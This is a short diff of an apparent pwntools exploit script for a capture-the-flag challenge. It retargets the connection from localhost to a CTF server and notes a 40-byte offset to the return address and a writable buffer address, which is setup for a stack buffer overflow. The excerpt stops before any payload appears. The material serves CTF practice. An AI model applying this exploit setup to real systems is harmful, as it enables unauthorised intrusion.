@@ -2,15 +2,15 @@ from pwn import *
 
 context.arch = 'amd64'
 
-r = remote('127.0.0.1',8888)
-#r = remote('csie.ctf.tw',10133)
+#r = remote('127.0.0.1',8888)
+r = remote('csie.ctf.tw',10130)
 
 r.recvuntil(':')
 #note rsi keep the addr of buf
 #the offset from buf to ret is 40
 
 #r.recvuntil('lol',timeout = 7)
-r.interactive()
+#r.interactive()
 pre = '\0'*40
 
 buf_address = 0x6c9a20             #could be any address which is rw,this position is at data section
